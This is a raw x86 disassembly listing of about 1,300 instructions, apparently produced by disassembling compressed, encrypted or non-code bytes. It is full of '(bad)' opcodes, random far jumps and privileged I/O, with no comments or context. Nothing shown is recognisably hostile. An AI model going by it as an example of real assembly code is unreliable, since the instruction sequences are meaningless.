  427539:	imul   ebp,DWORD PTR [eax+0x47],0xabe8b41c
  427540:	xor    bl,dl
  427542:	push   esp
  427543:	and    BYTE PTR [edx+0x61],ah
  427546:	imul   ecx,DWORD PTR [ecx+0x4134d076],0xffffffd9
  42754d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42754e:	ja     0x427506
  427550:	ds scas eax,DWORD PTR es:[edi]
  427552:	lds    ebx,FWORD PTR [ecx-0x72b5fc9e]
  427558:	mov    eax,0x61196dcb
  42755d:	jmp    0x35f3:0xf0d8246d
  427564:	(bad)  
  427566:	test   edi,ecx
  427568:	cli    
  427569:	ss add edi,ebx
  42756c:	ret    0xbba2
  42756f:	(bad)  
  427570:	sbb    edi,edx
  427572:	test   al,0x88
  427574:	mov    cl,0xa1
  427576:	mov    WORD PTR [ecx-0x4513a5fc],ss
  42757c:	daa    
  42757d:	pop    es
  42757e:	xchg   ebx,eax
  42757f:	push   cs
  427580:	mov    edx,0xaa936286
  427585:	xor    ebx,edx
  427587:	in     al,0x52
  427589:	xlat   BYTE PTR ds:[ebx]
  42758a:	xor    dl,BYTE PTR [edx+0xf]
  42758d:	outs   dx,DWORD PTR ds:[esi]
  42758e:	add    ebx,ebx
  427590:	xor    cl,BYTE PTR [edi]
  427592:	lock std 
  427594:	pop    edx
  427595:	mov    ecx,0xbc2401fb
  42759a:	inc    esi
  42759b:	mov    bh,cl
  42759d:	data16 add cl,dh
  4275a0:	and    BYTE PTR [edx],bl
  4275a2:	cs shl ah,1
  4275a5:	stc    
  4275a6:	push   ebp
  4275a7:	mov    esp,0x9fb5d925
  4275ac:	push   cs
  4275ad:	mov    ah,0x6d
  4275af:	add    esp,0xff267431
  4275b5:	enter  0x154f,0x4d
  4275b9:	inc    ecx
  4275ba:	iret   
  4275bb:	inc    eax
  4275bc:	mov    DWORD PTR [ebp+0x6433f033],esi
  4275c2:	push   ss
  4275c3:	sub    BYTE PTR cs:0x68f56d9f,0xb7
  4275cb:	pop    ebx
  4275cc:	inc    ebp
  4275cd:	mov    ch,0x39
  4275cf:	pop    ebp
  4275d0:	ss std 
  4275d2:	leave  
  4275d3:	ret    
  4275d4:	js     0x4275c2
  4275d6:	pop    eax
  4275d7:	scas   al,BYTE PTR es:[edi]
  4275d8:	xor    eax,0x75ba4ec7
  4275dd:	mov    WORD PTR [esi+0x45],gs
  4275e0:	mov    ebx,0x46e85e56
  4275e5:	int3   
  4275e6:	into   
  4275e7:	pop    edx
  4275e8:	scas   eax,DWORD PTR es:[edi]
  4275e9:	jae    0x4275fa
  4275eb:	adc    BYTE PTR [eax-0x36fdf0c4],al
  4275f1:	xor    eax,DWORD PTR [edx+0x34bb71a5]
  4275f7:	push   esi
  4275f8:	js     0x42762f
  4275fa:	rol    DWORD PTR [ebp+edi*4+0x783622fc],cl
  427601:	ds xor al,0x51
  427604:	hlt    
  427605:	(bad)  
  427606:	sahf   
  427607:	push   ds
  427608:	sbb    ebp,ecx
  42760a:	ja     0x427610
  42760c:	cs cld 
  42760e:	sar    DWORD PTR [esi+0x14],cl
  427611:	enter  0xb3f8,0xbe
  427615:	leave  
  427616:	fcomi  st,st(6)
  427618:	push   cs
  427619:	pop    DWORD PTR [ebx-0x14]
  42761c:	jmp    0x64ee:0xa51aaca8
  427623:	xchg   ebx,eax
  427624:	sbb    bl,BYTE PTR [edx+0x56e29301]
  42762a:	mov    ch,0x24
  42762c:	xchg   ebp,eax
  42762d:	cmp    eax,ecx
  42762f:	mov    esi,0x4f730f4a
  427634:	js     0x427636
	...
  427696:	add    DWORD PTR [esi-0x70],edx
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x916bf3d4
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [ebx+0x1a],dh
  4276b0:	or     BYTE PTR [esi+0x4efe20f],ah
  4276b6:	mov    eax,ds:0xb4f9c055
  4276bb:	xor    ah,BYTE PTR [edx]
  4276bd:	lock push ds
  4276bf:	adc    al,0x2e
  4276c1:	popf   
  4276c2:	shr    DWORD PTR [ebp-0x6],0xe5
  4276c6:	mov    BYTE PTR ds:0x79128b17,bh
  4276cc:	push   0xffffff92
  4276ce:	jge    0x4276a2
  4276d0:	retf   0x5458
  4276d3:	push   0x78997db2
  4276d8:	push   edi
  4276d9:	adc    eax,0x955d37c1
  4276de:	mov    ah,0x56
  4276e0:	and    esp,ecx
  4276e2:	cwde   
  4276e3:	mov    cl,0x88
  4276e5:	sub    DWORD PTR [bx-0x2215],ebx
  4276ea:	pushf  
  4276eb:	and    eax,0x5730bef1
  4276f0:	pop    ebp
  4276f1:	add    DWORD PTR gs:[ebx-0x6ffe3344],eax
  4276f8:	xchg   esi,edx
  4276fa:	mov    ebp,0x4b7ca3b6
  4276ff:	in     al,0x8b
  427701:	inc    esi
  427702:	and    BYTE PTR [esi+0x5f],ah
  427705:	mov    ds:0xd39d56b2,eax
  42770a:	repnz add DWORD PTR [edx+eiz*4-0x67fe4c0a],edx
  427712:	test   DWORD PTR [edx-0x7353275],ebx
  427718:	add    esi,DWORD PTR [edx]
  42771a:	(bad)  
  42771b:	pop    ss
  42771c:	out    0xed,al
  42771e:	adc    DWORD PTR [eax-0x24f970d9],ebx
  427724:	js     0x427720
  427726:	not    dl
  427728:	call   0x790f:0x48dd7c0b
  42772f:	adc    DWORD PTR [ebp+0x44],edx
  427732:	outs   dx,DWORD PTR ds:[esi]
  427733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427734:	mov    eax,ds:0x1f271bb6
  427739:	int3   
  42773a:	adc    edi,DWORD PTR es:[esi]
  42773d:	mov    WORD PTR [edx-0xb],ds
  427740:	jg     0x427763
  427742:	mov    dl,0x79
  427744:	xor    al,0x6f
  427746:	jns    0x427791
  427748:	jg     0x4276da
  42774a:	int    0x44
  42774c:	(bad)  
  42774d:	es test eax,0x383a853e
  427753:	(bad)  
  427754:	aad    0x41
  427756:	loopne 0x427713
  427758:	out    dx,eax
  427759:	cmp    ecx,ebp
  42775b:	dec    ebx
  42775c:	data16 aam 0x9
  42775f:	and    ecx,DWORD PTR [ecx-0x3cd6e1c8]
  427765:	xlat   BYTE PTR ds:[ebx]
  427766:	jbe    0x4277d9
  427768:	and    eax,0xe9d04d19
  42776d:	fs jmp 0x427704
  427770:	mov    eax,edx
  427772:	mov    ds:0xa269ab27,al
  427777:	stos   DWORD PTR es:[edi],eax
  427778:	and    eax,0x5179736d
  42777d:	xchg   esi,eax
  42777e:	add    al,0x17
  427780:	stc    
  427781:	imul   DWORD PTR [bp+si+0x30]
  427785:	and    al,0x98
  427787:	aam    0x41
  427789:	leave  
  42778a:	jge    0x427744
  42778c:	and    cl,ch
  42778e:	leave  
  42778f:	vmread DWORD PTR [esi],ebp
  427792:	jmp    0x2f8d:0xb6fa65c0
  427799:	pop    ebp
  42779a:	ss mov esp,0xfff7ecc9
  4277a0:	push   edi
  4277a1:	inc    eax
  4277a2:	add    al,0x7b
  4277a4:	icebp  
  4277a5:	jno    0x42775c
  4277a7:	inc    edx
  4277a8:	(bad)  
  4277a9:	gs leave 
  4277ab:	ja     0x4277a8
  4277ad:	or     ch,BYTE PTR [ebp-0x572a19eb]
  4277b3:	rol    BYTE PTR [ecx+0x0],cl
	...
  427816:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42781c:	pop    esi
  42781d:	fist   WORD PTR [edx-0x2f]
  427820:	cmp    al,0x27
  427822:	cmp    ebp,DWORD PTR [esi-0x5a5b707e]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    BYTE PTR [eax+0x36b74b19],dh
  427833:	pusha  
  427834:	imul   eax,DWORD PTR [ebx+0x6e],0x45
  427838:	inc    esp
  427839:	inc    cx
  42783b:	lods   al,BYTE PTR ds:[esi]
  42783c:	(bad)  
  42783d:	xor    DWORD PTR [ebx-0x5a9668f8],esi
  427843:	dec    ebp
  427844:	mov    edi,0x69c2f8fc
  427849:	mov    WORD PTR [eax],ds
  42784b:	addr16 push 0x6d8d033f
  427851:	mov    ?,WORD PTR [edi-0x29bfc8b]
  427857:	and    BYTE PTR ds:0x39618fc8,ch
  42785d:	loope  0x4277fc
  42785f:	(bad)  
  427860:	adc    eax,DWORD PTR [esi+eax*4+0x4f9c889f]
  427867:	ins    BYTE PTR es:[edi],dx
  427868:	fs add al,0xe0
  42786b:	je     0x42785d
  42786d:	jae    0x4278cc
  42786f:	fnstcw WORD PTR [eax+ecx*4-0xa]
  427873:	or     ecx,ebp
  427875:	pop    ecx
  427876:	daa    
  427877:	scas   al,BYTE PTR es:[edi]
  427878:	cld    
  427879:	jns    0x42783a
  42787b:	in     eax,dx
  42787c:	push   ebp
  42787d:	int3   
  42787e:	pop    ecx
  42787f:	or     BYTE PTR [eax+0x60],0xeb
  427883:	loop   0x427841
  427885:	adc    DWORD PTR [edi-0x2429896b],edx
  42788b:	test   al,0xb
  42788d:	push   edx
  42788e:	pop    ebp
  42788f:	stos   BYTE PTR es:[edi],al
  427890:	sahf   
  427891:	outs   dx,DWORD PTR ds:[esi]
  427892:	in     eax,dx
  427893:	mov    cl,0xf7
  427895:	xchg   edx,eax
  427896:	popa   
  427897:	loop   0x427918
  427899:	sub    eax,0x29
  42789c:	add    BYTE PTR [ebp+0x63],dl
  42789f:	and    eax,0x566bf83d
  4278a4:	mov    ch,0x14
  4278a6:	in     eax,dx
  4278a7:	mov    esi,0xdb818a81
  4278ac:	fs inc edi
  4278ae:	(bad)
  4278b2:	dec    ebp
  4278b3:	popf   
  4278b4:	imul   ebp,DWORD PTR [ebp+0x63287fe2],0xd2a4ef6c
  4278be:	or     edi,edi
  4278c0:	push   esp
  4278c1:	xor    BYTE PTR [eax+ecx*8+0x76d84ad3],0x6f
  4278c9:	cmp    ch,BYTE PTR [esi+0x4d66a499]
  4278cf:	mov    dh,0xf
  4278d1:	(bad)  
  4278d2:	jmp    0xd20ac9c3
  4278d7:	pop    ds
  4278d8:	fild   QWORD PTR [edi]
  4278da:	fcom   QWORD PTR [esi-0x7c31b83e]
  4278e0:	test   eax,0xb394a752
  4278e5:	stc    
  4278e6:	push   ebp
  4278e7:	ja     0x427884
  4278e9:	pop    edi
  4278ea:	or     al,0xf8
  4278ec:	mov    esp,ss
  4278ee:	aad    0x7c
  4278f0:	stc    
  4278f1:	shl    BYTE PTR [ebx-0x4087a183],1
  4278f7:	(bad)  
  4278f8:	(bad)  
  4278f9:	fsubr  st(6),st
  4278fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278fc:	mov    bl,0x76
  4278fe:	fsub   DWORD PTR [ebx]
  427900:	(bad)  
  427901:	push   esi
  427902:	test   DWORD PTR [ebp-0xd84eea7],edx
  427908:	xchg   esi,eax
  427909:	fbld   TBYTE PTR [esi]
  42790b:	or     ch,al
  42790d:	xchg   edx,eax
  42790e:	shr    DWORD PTR [edi-0x31],cl
  427911:	inc    ebx
  427912:	test   DWORD PTR [esi],0xab4ce3a3
  427918:	mov    DWORD PTR [ebp+0x152e295b],esp
  42791e:	mov    cl,0x88
  427920:	mov    ds:0x3082de36,al
  427925:	ins    BYTE PTR es:[edi],dx
  427926:	adc    eax,0xb0c5f243
  42792b:	jmp    0x905e6106
  427930:	leave  
  427931:	test   al,0x3a
  427933:	in     al,0x15
	...
  427995:	add    BYTE PTR [edx-0x5c0023],bl
  42799b:	mov    ds:0x63e5fdde,eax
  4279a0:	mov    ebx,0xb0f51d0
  4279a5:	jae    0x427952
  4279a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a8:	add    DWORD PTR [eax],eax
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR [ecx-0x169d33c1],bh
  4279b3:	add    eax,0xe090cf88
  4279b8:	dec    edi
  4279b9:	and    dh,BYTE PTR [esi+ebp*8-0x6a]
  4279bd:	mov    ah,0xf0
  4279bf:	sub    eax,0xdebcf175
  4279c4:	test   al,0x90
  4279c6:	adc    ebx,ecx
  4279c8:	push   ebx
  4279c9:	pop    esi
  4279ca:	mov    ?,WORD PTR [edx]
  4279cc:	pop    esi
  4279cd:	gs dec ebp
  4279cf:	push   ds
  4279d0:	std    
  4279d1:	test   DWORD PTR [ecx],esi
  4279d3:	jnp    0x427a0d
  4279d5:	or     eax,0x12ecf125
  4279da:	loope  0x4279ad
  4279dc:	xchg   ebp,eax
  4279dd:	dec    esp
  4279de:	jno    0x4279e8
  4279e0:	mov    ch,0x5a
  4279e2:	cwde   
  4279e3:	out    0x58,eax
  4279e5:	inc    edi
  4279e6:	pop    edi
  4279e7:	mov    bl,0x52
  4279e9:	pavgb  mm0,QWORD PTR [esi-0x3c]
  4279ed:	dec    esp
  4279ee:	into   
  4279ef:	sbb    al,0x3
  4279f1:	test   al,0x36
  4279f3:	mov    WORD PTR [esi-0x24616fb9],?
  4279f9:	(bad)  
  4279fa:	push   ebx
  4279fb:	call   0xe8af:0x5d0ea770
  427a02:	add    bh,BYTE PTR [edx+0x3e]
  427a05:	add    eax,0x141855cf
  427a0a:	std    
  427a0b:	sbb    DWORD PTR [edi-0x61ba43eb],0x2280c020
  427a15:	jns    0x4279ae
  427a17:	mov    ecx,esp
  427a19:	pusha  
  427a1a:	daa    
  427a1b:	xchg   DWORD PTR [ebp-0x54],ecx
  427a1e:	mov    edx,0x75fc845a
  427a23:	xor    al,0x3e
  427a25:	arpl   bx,dx
  427a27:	mov    ebx,0x10cfd189
  427a2c:	out    dx,al
  427a2d:	in     eax,dx
  427a2e:	pop    ss
  427a2f:	cld    
  427a30:	adc    edi,ecx
  427a32:	aas    
  427a33:	and    eax,0x6aab2adb
  427a38:	dec    eax
  427a39:	pushf  
  427a3a:	jge    0x4279e3
  427a3c:	jns    0x427a67
  427a3e:	pop    esp
  427a3f:	nop
  427a40:	mov    al,0x8c
  427a42:	mov    bl,0xcf
  427a44:	push   0xfffffff7
  427a46:	pop    ds
  427a47:	push   cs
  427a48:	shl    DWORD PTR [esi-0x5],0xeb
  427a4c:	cmp    al,0xf6
  427a4e:	mov    edx,0xcb595a3f
  427a53:	push   cs
  427a54:	inc    ecx
  427a56:	in     al,dx
  427a57:	and    BYTE PTR ds:0x687c96a1,0x10
  427a5e:	mov    bh,0x69
  427a60:	cli    
  427a61:	jge    0x427a15
  427a63:	aad    0xc2
  427a65:	dec    ebp
  427a66:	jne    0x427a50
  427a68:	mov    bh,0xd5
  427a6a:	add    DWORD PTR [ebx],edx
  427a6c:	dec    esp
  427a6d:	sub    esp,DWORD PTR [ebx-0x2b]
  427a70:	call   0x6e00ae9c
  427a75:	jmp    WORD PTR [ecx]
  427a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a79:	js     0x4279ff
  427a7b:	xchg   esi,eax
  427a7c:	je     0x427a7e
  427a7e:	mov    ds:0x2aafd489,al
  427a83:	ins    DWORD PTR es:[edi],dx
  427a84:	(bad)  
  427a85:	push   esp
  427a86:	in     al,dx
  427a87:	cdq    
  427a88:	std    
  427a89:	xor    al,BYTE PTR [ecx+0x77]
  427a8c:	push   ecx
  427a8d:	loope  0x427af2
  427a8f:	ret    
  427a90:	in     al,dx
  427a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a92:	mov    edx,0x1e2f3928
  427a97:	cmp    DWORD PTR [ebp+0x6902292e],eax
  427a9d:	(bad)  
  427a9e:	outs   dx,BYTE PTR ds:[esi]
  427a9f:	or     al,0x85
  427aa1:	sub    dh,BYTE PTR [edx+0x7]
  427aa4:	leave  
  427aa5:	push   eax
  427aa6:	or     BYTE PTR ds:0x6fa118ff,cl
  427aac:	sub    BYTE PTR ds:0xcd35b5ac,al
  427ab2:	or     eax,esp
  427ab4:	fld    DWORD PTR [eax]
	...
  427b16:	retf   0x528b
  427b19:	jnp    0x427b6e
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	jae    0x427aae
  427b24:	es pop esp
  427b26:	mov    dl,0xa7
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [eax-0x7ffa4df8],bh
  427b33:	icebp  
  427b34:	fdiv   DWORD PTR [edx]
  427b36:	adc    DWORD PTR [esi+0x28],0x360c7901
  427b3d:	inc    edx
  427b3e:	adc    eax,0xfce0a005
  427b43:	ss pop ds
  427b45:	mov    al,BYTE PTR [eax]
  427b47:	imul   BYTE PTR [edx+0x63c562d7]
  427b4d:	and    esi,DWORD PTR [edx]
  427b4f:	and    edi,DWORD PTR [esi-0x7d078e]
  427b55:	nop
  427b56:	sahf   
  427b57:	jge    0x427b3c
  427b59:	inc    ebx
  427b5a:	dec    edx
  427b5b:	aas    
  427b5c:	cmp    DWORD PTR [edi-0x2e69bb2b],edx
  427b62:	pop    ecx
  427b63:	int    0xb9
  427b65:	and    ebp,esp
  427b67:	imul   eax,DWORD PTR [edx-0x296fb7c],0x7e
  427b6e:	inc    eax
  427b6f:	leave  
  427b70:	push   ebp
  427b71:	cmp    eax,esp
  427b73:	ds dec ebx
  427b75:	jns    0x427bad
  427b77:	jbe    0x427bd0
  427b79:	mov    eax,cs
  427b7b:	mov    bl,0xc0
  427b7d:	adc    al,0xe8
  427b7f:	ja     0x427bac
  427b81:	mov    WORD PTR [ecx-0x5d],ds
  427b84:	xchg   BYTE PTR [ebx+0xe3a525a],cl
  427b8a:	lods   al,BYTE PTR ds:[esi]
  427b8b:	test   BYTE PTR [edx],cl
  427b8d:	or     DWORD PTR [esi-0x12e2257a],0xffffffff
  427b94:	popf   
  427b95:	push   esi
  427b96:	sub    edx,esp
  427b98:	std    
  427b99:	xlat   BYTE PTR ds:[ebx]
  427b9a:	stos   BYTE PTR es:[edi],al
  427b9b:	inc    ebp
  427b9c:	sbb    eax,0xb415c2d5
  427ba1:	ins    BYTE PTR es:[edi],dx
  427ba2:	aaa    
  427ba3:	add    ebx,DWORD PTR [ebx-0x45]
  427ba6:	in     al,dx
  427ba7:	rcl    BYTE PTR [esi+edi*1-0x76f01d10],0xe9
  427baf:	(bad)  
  427bb0:	xor    al,0x2a
  427bb2:	pushf  
  427bb3:	mov    eax,ds:0xed0e92a1
  427bb8:	sub    ah,BYTE PTR [ebx-0x29]
  427bbb:	push   ecx
  427bbc:	mov    esi,0xd86b3bff
  427bc1:	lahf   
  427bc2:	xchg   edi,eax
  427bc3:	sub    al,0xae
  427bc5:	cmp    ecx,DWORD PTR [esp+esi*2]
  427bc8:	hlt    
  427bc9:	jg     0x427bed
  427bcb:	push   cs
  427bcc:	cmp    eax,0x6f9bd1a9
  427bd1:	es pop ebx
  427bd3:	rol    BYTE PTR [ebp-0x4b],0x6b
  427bd7:	pop    ebp
  427bd8:	loop   0x427c43
  427bda:	cmp    eax,0xb91f3b99
  427bdf:	icebp  
  427be0:	xlat   BYTE PTR ds:[ebx]
  427be1:	push   eax
  427be2:	mov    bh,0xbf
  427be4:	repnz shl DWORD PTR [eax-0x4eb90437],0xbd
  427bec:	push   esi
  427bed:	mov    edi,0xf6f6c8eb
  427bf2:	push   es
  427bf3:	adc    eax,0x85180fa6
  427bf8:	inc    esp
  427bf9:	pop    edx
  427bfa:	xchg   ah,bh
  427bfc:	icebp  
  427bfd:	inc    ebx
  427bfe:	cmp    BYTE PTR [eax-0x74],bh
  427c01:	cmc    
  427c02:	loopne 0x427bbc
  427c04:	test   DWORD PTR [edi],ebx
  427c06:	sub    DWORD PTR [edi-0xe],ecx
  427c09:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c0b:	and    BYTE PTR [edi+0x20d1c828],0x51
  427c12:	mov    ds:0xfebda58a,eax
  427c17:	mov    ds:0x44f7a819,al
  427c1c:	nop
  427c1d:	pop    ebp
  427c1e:	and    bh,0x6e
  427c21:	dec    ebp
  427c22:	xor    edx,ebx
  427c24:	add    ch,BYTE PTR [edx]
  427c26:	test   al,0x9b
  427c28:	jo     0x427c9b
  427c2a:	xor    bl,dl
  427c2c:	pop    esp
  427c2d:	jb     0x427c17
  427c2f:	ror    edi,1
  427c31:	enter  0x3177,0xca
	...
  427c95:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0x65cad85
  427ca5:	or     al,0xb9
  427ca7:	test   al,0x1
  427ca9:	add    BYTE PTR [edi],al
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    BYTE PTR [ecx-0x264d0dc1],bl
  427cb3:	pop    eax
  427cb4:	sar    DWORD PTR [ecx-0x6bc00675],1
  427cba:	push   ds
  427cbb:	push   edx
  427cbc:	push   es
  427cbd:	or     edx,DWORD PTR [eax+0x4]
  427cc0:	xor    bh,bh
  427cc2:	out    dx,eax
  427cc3:	call   0x75c3:0xd5425399
  427cca:	or     esi,ebx
  427ccc:	into   
  427ccd:	or     ch,al
  427ccf:	push   eax
  427cd0:	fwait
  427cd1:	call   0xda3dc2fa
  427cd6:	nop
  427cd7:	adc    esi,DWORD PTR [edx+0x77]
  427cda:	xor    dl,BYTE PTR [eax+ecx*2+0x54065391]
  427ce1:	ins    DWORD PTR es:[edi],dx
  427ce2:	popf   
  427ce3:	arpl   WORD PTR [esi-0x61eafeb],bx
  427ce9:	sbb    ax,0x6abc
  427ced:	int3   
  427cee:	test   DWORD PTR [edx+0x4f],ebp
  427cf1:	or     DWORD PTR [ecx+0x5972e912],ebp
  427cf7:	dec    eax
  427cf8:	clc    
  427cf9:	mov    DWORD PTR [eax+0xc],ebp
  427cfc:	jle    0x427cf8
  427cfe:	cdq    
  427cff:	or     BYTE PTR [edi-0x3df69890],cl
  427d05:	sbb    eax,0xc45cab24
  427d0a:	push   esp
  427d0b:	mov    esi,gs
  427d0d:	jb     0x427d4f
  427d0f:	push   edx
  427d10:	mov    WORD PTR [ecx+0x1206bdfb],fs
  427d16:	mov    esp,0x65a970a3
  427d1b:	psrad  mm0,QWORD PTR [eax-0x39]
  427d1f:	retf   
  427d20:	xor    BYTE PTR [edx],dl
  427d22:	fsubr  QWORD PTR [ebp-0x40546fb4]
  427d28:	mov    ebp,0xc846ee2d
  427d2d:	inc    esi
  427d2e:	aas    
  427d2f:	cli    
  427d30:	mov    cl,0x4e
  427d32:	not    BYTE PTR [esp+eax*2]
  427d35:	mov    ds:0xd27b5309,eax
  427d3a:	test   edx,ebp
  427d3c:	inc    esi
  427d3d:	dec    ecx
  427d3e:	into   
  427d3f:	(bad)  
  427d40:	lods   al,BYTE PTR ds:[esi]
  427d41:	push   cs
  427d42:	rcl    BYTE PTR [esp+edi*1],cl
  427d45:	mov    al,0xc1
  427d47:	stos   BYTE PTR es:[edi],al
  427d48:	xlat   BYTE PTR ds:[ebx]
  427d49:	push   esp
  427d4a:	lea    esp,[edi+ebp*4+0x70]
  427d4e:	xchg   esp,eax
  427d4f:	stos   BYTE PTR es:[edi],al
  427d50:	sub    al,0x5
  427d52:	in     al,0x68
  427d54:	cmp    DWORD PTR [edx],esp
  427d56:	stos   BYTE PTR es:[edi],al
  427d57:	xchg   esi,eax
  427d58:	in     al,0xaf
  427d5a:	add    dl,dl
  427d5c:	xchg   edx,eax
  427d5d:	mov    ecx,0xdb91938
  427d62:	pop    esi
  427d63:	(bad)  
  427d64:	sahf   
  427d65:	fst    DWORD PTR [ebx+0x9]
  427d68:	sbb    esi,DWORD PTR [eax+esi*1-0x18]
  427d6c:	xchg   ebp,eax
  427d6d:	or     DWORD PTR [ebx],ebp
  427d6f:	test   al,0xff
  427d71:	in     al,dx
  427d72:	dec    edx
  427d73:	out    dx,eax
  427d74:	xchg   esi,eax
  427d75:	mov    ds:0xfbabb4c7,eax
  427d7a:	repnz inc edx
  427d7c:	sub    DWORD PTR [edx+0x20b4c4a9],0x4ac0e5ab
  427d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d87:	jmp    0x427d8a
  427d89:	and    al,BYTE PTR [edi]
  427d8b:	or     ecx,DWORD PTR [ebx]
  427d8d:	cmp    DWORD PTR [esp+ebx*2],eax
  427d90:	push   edx
  427d91:	out    0x5a,eax
  427d93:	sbb    DWORD PTR [edx],0x7a61ef69
  427d99:	jl     0x427e12
  427d9b:	add    BYTE PTR [ecx-0x72be6a39],ah
  427da1:	fcmovb st,st(1)
  427da3:	stos   BYTE PTR es:[edi],al
  427da4:	add    BYTE PTR [edx+ebp*4-0x479d9ed4],bl
  427dab:	test   DWORD PTR [ebx-0x64a178b4],ebx
  427db1:	inc    ecx
  427db2:	pop    ecx
  427db3:	add    DWORD PTR [eax+eax*1+0x0],ebp
	...
  427e13:	add    BYTE PTR [eax],al
  427e15:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    bh,dh
  427e23:	cwde   
  427e24:	pushf  
  427e25:	enter  0xa9c0,0x1
  427e29:	add    BYTE PTR [edi],al
  427e2b:	add    DWORD PTR [eax],eax
  427e2d:	add    BYTE PTR [ebp+0x24],bh
  427e30:	jle    0x427e30
  427e32:	ss (bad) 
  427e34:	stc    
  427e35:	mov    edi,0xe7543cfd
  427e3a:	mov    al,0xb2
  427e3c:	cdq    
  427e3d:	loop   0x427e5e
  427e3f:	je     0x427e21
  427e41:	aam    0x1a
  427e43:	sbb    BYTE PTR [esi-0x3d7a54ca],0xf7
  427e4a:	push   ds
  427e4b:	jmp    0x6c74b3bc
  427e50:	ret    
  427e51:	sar    DWORD PTR [ebp-0x98d819a],0xfc
  427e58:	sar    DWORD PTR [ebx+0x3],1
  427e5b:	popa   
  427e5c:	inc    eax
  427e5d:	aam    0x75
  427e5f:	mov    ebx,0x5b84fd5c
  427e64:	xchg   ebp,eax
  427e65:	sbb    eax,0x153731aa
  427e6a:	cwde   
  427e6b:	add    al,0x57
  427e6d:	(bad)  
  427e6e:	ss and al,0x17
  427e71:	dec    ebx
  427e72:	in     al,0xc6
  427e74:	and    ah,BYTE PTR [edx]
  427e76:	ss and ah,BYTE PTR fs:[ebx+0x4f]
  427e7b:	adc    edi,DWORD PTR [ebp+0x6d00562e]
  427e81:	mov    ?,esi
  427e83:	cmp    al,0xd2
  427e85:	lods   eax,DWORD PTR ds:[esi]
  427e86:	cld    
  427e87:	lock mov bl,0x62
  427e8a:	sub    al,0xd3
  427e8c:	mov    edi,0xffdf196b
  427e91:	or     ah,al
  427e93:	xor    dh,BYTE PTR [edi+0x6a02a995]
  427e99:	xlat   BYTE PTR ds:[ebx]
  427e9a:	lds    ebp,FWORD PTR [eax+0x27]
  427e9d:	or     DWORD PTR [eax+0x57],eax
  427ea0:	dec    ecx
  427ea1:	loop   0x427edb
  427ea3:	mov    al,BYTE PTR [eax-0x11]
  427ea6:	pop    edx
  427ea7:	cmp    ah,BYTE PTR [eax]
  427ea9:	sbb    al,0x1d
  427eab:	add    cl,BYTE PTR [eax+0x1e9e4303]
  427eb1:	inc    esp
  427eb2:	push   cs
  427eb3:	jp     0x427eb4
  427eb5:	retf   
  427eb6:	adc    al,0x36
  427eb8:	xor    ebp,DWORD PTR [esi]
  427eba:	push   edx
  427ebb:	sub    ebp,DWORD PTR [esi+0x30aef1f9]
  427ec1:	into   
  427ec2:	loopne 0x427ecb
  427ec4:	mov    ebp,0x1d93a266
  427ec9:	fs mov al,0x7a
  427ecd:	std    
  427ece:	gs push ds
  427ed0:	pop    edi
  427ed1:	cmc    
  427ed2:	mov    ebp,0xe843bab8
  427ed7:	jmp    0x53bc:0xdf0dc99f
  427ede:	push   ss
  427edf:	cvtdq2ps xmm2,XMMWORD PTR [ebp+0x7c7eb91c]
  427ee6:	adc    DWORD PTR [esi-0x2ea19337],ebx
  427eec:	int    0x36
  427eee:	jge    0x427e7a
  427ef0:	ins    DWORD PTR es:[edi],dx
  427ef1:	sbb    dl,BYTE PTR [edi]
  427ef3:	fisubr DWORD PTR [esi]
  427ef5:	stos   DWORD PTR es:[edi],eax
  427ef6:	cld    
  427ef7:	lods   eax,DWORD PTR ds:[esi]
  427ef8:	mov    dh,0xf8
  427efa:	cmp    BYTE PTR [eax-0x50],0x4d
  427efe:	scas   eax,DWORD PTR es:[edi]
  427eff:	ds std 
  427f01:	clc    
  427f02:	jbe    0x427f5c
  427f04:	into   
  427f05:	mov    DWORD PTR [eax+0x5ee54b83],eax
  427f0b:	sub    bl,BYTE PTR [eax+0x11ac7a81]
  427f11:	xchg   edi,eax
  427f12:	jbe    0x427f81
  427f14:	push   edx
  427f15:	mov    edi,0x21bab94d
  427f1a:	dec    esi
  427f1b:	repnz xor al,0x91
  427f1e:	out    dx,al
  427f1f:	mov    esi,0xe69eaed7
  427f24:	das    
  427f25:	adc    BYTE PTR [bx-0x4e7e],al
  427f2a:	add    dl,dl
  427f2c:	mov    eax,0x84312e6b
  427f31:	inc    edx
  427f32:	out    dx,eax
  427f33:	add    edx,DWORD PTR [eax+eax*1]
	...
  427f96:	mov    cl,0xa7
  427f98:	dec    ebx
  427f99:	das    
  427f9a:	pop    edi
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	xchg   ebx,eax
